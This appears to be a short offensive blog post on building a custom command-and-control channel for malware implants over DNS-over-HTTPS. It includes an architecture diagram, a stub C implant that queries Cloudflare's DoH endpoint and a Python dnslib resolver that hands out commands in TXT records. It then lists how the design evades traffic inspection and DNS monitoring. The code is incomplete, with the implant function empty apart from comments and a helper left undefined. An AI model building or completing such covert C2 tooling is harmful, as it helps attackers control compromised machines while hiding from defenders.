# Building a Custom C2 Channel

> **Tags:** Malware Dev, C2  
> **Date:** 2025-01

---

## Overview

Commercial C2 frameworks are powerful, but they're also heavily signatured. In this post, we walk through building a lightweight, custom command-and-control channel using DNS-over-HTTPS (DoH) for covert communications.

---

## Architecture

```
[Implant] → DNS Query (TXT record) → [DoH Provider] → [Authoritative NS / C2 Server]
                                                              ↓
[Implant] ← DNS Response (TXT record) ← [DoH Provider] ← [C2 Server]
```

The implant sends DNS queries via DoH to a public resolver (e.g., Cloudflare's 1.1.1.1). The queries target a domain we control, so our authoritative nameserver acts as the C2 server.

---

## Implementation

### Implant — DNS Query via DoH

```c
#include <windows.h>
#include <winhttp.h>

// Send DoH query to Cloudflare
BOOL SendDoHQuery(const char* domain, char* response, DWORD maxLen) {
    // Build DNS wire format query
    // POST to https://cloudflare-dns.com/dns-query
    // Content-Type: application/dns-message
    // Parse TXT record from response
    return TRUE;
}
```

### C2 Server — Authoritative DNS

```python
from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, TXT, QTYPE

class C2Resolver(BaseResolver):
    def resolve(self, request, handler):
        reply = request.reply()
        qname = str(request.q.qname)

        # Parse beacon data from subdomain
        # Return command in TXT record
        cmd = self.get_pending_command(qname)
        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(cmd)))
        return reply
```

---

## Evasion Benefits

- **Blends with normal traffic** — DoH is encrypted HTTPS to well-known providers
- **No direct connection** to C2 infrastructure from the target network
- **Bypasses DNS monitoring** — traditional DNS inspection can't see DoH content
- **Low and slow** — DNS-based C2 naturally has low bandwidth, reducing detection risk

---

## Limitations

- Low bandwidth (~500 bytes per TXT record)
- Latency depends on DNS TTL and polling interval
- Some environments block external DoH providers
